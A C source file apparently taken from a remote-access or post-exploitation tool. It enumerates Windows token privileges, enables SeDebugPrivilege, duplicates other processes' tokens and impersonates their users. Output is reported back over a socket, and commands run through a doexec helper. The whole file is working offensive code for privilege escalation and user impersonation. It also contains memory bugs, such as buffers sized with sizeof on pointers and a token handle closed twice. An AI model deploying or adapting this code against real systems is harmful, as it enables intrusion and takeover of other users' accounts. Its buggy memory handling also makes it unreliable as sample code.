/*
* Author: Aleksa Zatezalo
* Date: September 2024
* Description: Returns basic token info and allows for impersonation.
*/

#include "token_info.h"
#include "doexec.h"
#include <sddl.h>
#include <userenv.h>
#include <stdlib.h>
#include <Lmcons.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <aclapi.h>

#define ERROR_NOT_ALL_ASSIGNED 1300L

int username(int sockfd){

    /*print Impersonator*/
    char *print_this = "\r\n\r\n[+] The Current User Is: ";
    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
    
    char *whoami = "whoami\r\n";
    char *name = doexec(whoami, 0);
    send(sockfd, name, sizeof(char) * strlen(name), 0);
    free(name);
    return 0;
}

char* GetTokenPrivilegesAsString(HANDLE hToken) {
    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);

    PTOKEN_PRIVILEGES pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
    if (pTokenPrivileges == NULL) {
        return NULL;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwSize, &dwSize)) {
        free(pTokenPrivileges);
        return NULL;
    }

    // Estimate size for output string
    size_t outputSize = 0;
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        DWORD dwNameSize = 0;
        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, NULL, &dwNameSize);
        outputSize += dwNameSize + 50; // Add space for attributes and formatting
    }

    char* output = (char*)malloc(outputSize);
    if (output == NULL) {
        free(pTokenPrivileges);
        return NULL;
    }
    
    // Prepare the output string
    char* current = output;
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        DWORD dwNameSize = 0;
        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, NULL, &dwNameSize);
        char* privilegeName = (char*)malloc(dwNameSize);
        LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid, privilegeName, &dwNameSize);

        // Append privilege information to output string
        int len = sprintf(current, "%s: %s\n", privilegeName,
                          (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled");
        current += len;

        free(privilegeName);
    }

    free(pTokenPrivileges);
    return output;
}

BOOL HasTokenPermission(HANDLE hToken, DWORD desiredAccess) {
    HANDLE hTokenDup;
    if (DuplicateTokenEx(hToken, desiredAccess, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup)) {
        CloseHandle(hTokenDup);
        return TRUE;
    }
    return FALSE;
}

char *PrintUserInfoFromToken(DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    char *error = "ERROR";
    char *result;
    char *banner = "[!] Associated user: ";
    if (hProcess == NULL) {
        printf("Error opening process: %d\n", GetLastError());
        return error;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        printf("Error opening process token: %d\n", GetLastError());
        CloseHandle(hProcess);
        return error;
    }

    DWORD tokenInfoLength = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLength);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(tokenInfoLength);
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoLength, &tokenInfoLength)) {
        printf("Error getting token information: %d\n", GetLastError());
        free(pTokenUser);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return error;
    }

    char* privilegesString = GetTokenPrivilegesAsString(hToken);
    char* debug_required = "\r\n[!] The Debug privilege may be required.";
    char* has_duplicate = "\r\n     [-] Token does not have duplicate perms.";
    char* has_impersonate  = "\r\n     [-] Token does not have impersonate perms. \r\n";
    if (HasTokenPermission(hToken, TOKEN_DUPLICATE)){
        has_duplicate = "\r\n     [+] Token has duplicate perms.";
    }
    if (HasTokenPermission(hToken, TOKEN_IMPERSONATE)){
        has_impersonate  = "\r\n     [+] Token has have impersonate perms.";
    }
    if (HasTokenPermission(hToken, TOKEN_IMPERSONATE) & HasTokenPermission(hToken, TOKEN_DUPLICATE)){
        debug_required = "\r\n[+] The Debug privilege may not be required.";
    }


    // Convert SID to string
    LPTSTR sidString;
    if (ConvertSidToStringSid(pTokenUser->User.Sid, &sidString)) {
        LocalFree(sidString);
    }

    // Get user name and domain
    DWORD userNameLen = 0;
    DWORD domainNameLen = 0;
    SID_NAME_USE sidType;
    
    LookupAccountSid(NULL, pTokenUser->User.Sid, NULL, &userNameLen, NULL, &domainNameLen, &sidType);
    
    TCHAR* userName = (TCHAR*)malloc(userNameLen * sizeof(TCHAR));
    TCHAR* domainName = (TCHAR*)malloc(domainNameLen * sizeof(TCHAR));

    if (!LookupAccountSid(NULL, pTokenUser->User.Sid, userName, &userNameLen, domainName, &domainNameLen, &sidType)) {
        result = "ERROR: Process potentially terminated.";
    }

    result = malloc(( strlen(banner) + strlen(userName) + strlen(domainName) + strlen(has_duplicate) + strlen(has_impersonate) + strlen(debug_required) + 2)*sizeof(char));
    strcpy(result, banner);
    strcat(result, domainName);
    strcat(result, "\\");
    strcat(result, userName);
    strcat(result, debug_required);
    strcat(result, has_duplicate);
    strcat(result, has_impersonate);

    // Cleanup
    free(userName);
    free(domainName);
    free(pTokenUser);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return result;
}

void PrintError(LPTSTR msg) {
    DWORD errCode = GetLastError();
    LPVOID lpMsgBuf;

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0, NULL);

    _tprintf(TEXT("%s: %d - %s\n"), msg, errCode, (char*)lpMsgBuf);
    LocalFree(lpMsgBuf);
}

char *EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {

	// HANDLE hToken // Handle where the stolen access token will be stored
	// LPCTSTR PrivName // Privilege name to enable/disable 
	// BOOL EnablePrivilege // Enable/Disable privilege

	TOKEN_PRIVILEGES tp;
	LUID luid; // A pointer to recieve LUID of the privilege on local system

    char *result;
	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
        char *val = "[-] LookupPrivilegeValue() Failed\r\n";
        result = malloc(strlen(val) * sizeof(char) + 2);
		strcpy(result, val);
        return result;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
	{
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
        char *val = "AdjustTokenPrivileges() Failed\r\n";
        result = malloc(strlen(val) * sizeof(char) + 2);
		strcpy(result, val);
        return result;
	}
    
    char *val = "[+] Privilege enabled!\r\n";
    result = malloc(strlen(val) * sizeof(char) + 2);
	strcpy(result, val);
    return result;
}

char *EnableDebugPrivilege() {
    HANDLE hToken;
    char *result;
    char *failedProc = "[-] OpenProcessToken error\r\n";
    char *lookupError = "[-] LookupPrivilegeValue error\r\n";
    char *adjustError = "[-] AdjustTokenPrivileges error\r\n";
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        result = malloc(sizeof(failedProc) + 1);
        strcpy(result, failedProc);
        return result;
    }

    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        result = malloc(sizeof(lookupError) + 1);
        strcpy(result, lookupError);
        return result;
    }

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        result = malloc(sizeof(adjustError) + 1);
        strcpy(result, adjustError);
        return result;
    }
    CloseHandle(hToken);
    
    char *goodProc = "[+] Local process token opened.\r\n";
    char *goodLookup = "[+] Privilege list recived.\r\n";
    char *goodAdjust = "[+] Debug privilege enable.\r\n";
    int len = strlen(goodProc) + strlen(goodLookup) + strlen(goodAdjust);
    int size = len * sizeof(char);
    result = malloc(size + 1);
    strcpy(result, goodProc);
    strcat(result, goodLookup);
    strcat(result, goodAdjust);
    return result;
}

char *name(){
    char username[256]; 
    DWORD username_len = sizeof(username);  // Length of the buffer
    char *result;
    char *intro = "[+] Current user: ";
    memset(username, 0, 256);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len)) {
       result = malloc(sizeof(intro) + sizeof(username) + 3);
       strcpy(result, intro);
       strcat(result, username);
       strcat(result, "\r\n");
    } else {    
        char *fail = "Failed to get username.\r\n";
        result = malloc(sizeof(fail));
        strcpy(result, fail);
    }

    return result;
}

HANDLE OpenProcessWithToken(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("[-] OpenProcess error: %u\n", GetLastError());
        return NULL;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken error: %u\n", GetLastError());
        CloseHandle(hProcess);
        return NULL;
    }

    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
        printf("[-] DuplicateTokenEx error: %u\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return NULL;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);

    return hDuplicatedToken;
}

char *impersonate(int pid){
    char *first_user = name();
    HANDLE hToken = OpenProcessWithToken(pid);
    char *open = "[-] Failed to obtain duplicated token.\r\n";
    char *new_user = name();
    char *impersonateStr = "[+] Impersonated new user.\r\n";
    if (hToken) {
        open = "[+] Successfully obtained duplicated token.\r\n";

        // Impersonate the user
        if (!ImpersonateLoggedOnUser(hToken)) {
            impersonateStr = "[-] ImpersonateLoggedOnUser error.";
            CloseHandle(hToken);
        }

        new_user = name();
        RevertToSelf();
        CloseHandle(hToken);
    }

    char *result = malloc((strlen(first_user) + strlen(open) + strlen(impersonateStr) + strlen(new_user))*sizeof(char) + 2); 
    strcpy(result, first_user);
    strcat(result, open);
    strcat(result, impersonateStr);
    strcat(result, new_user);

    return result;
}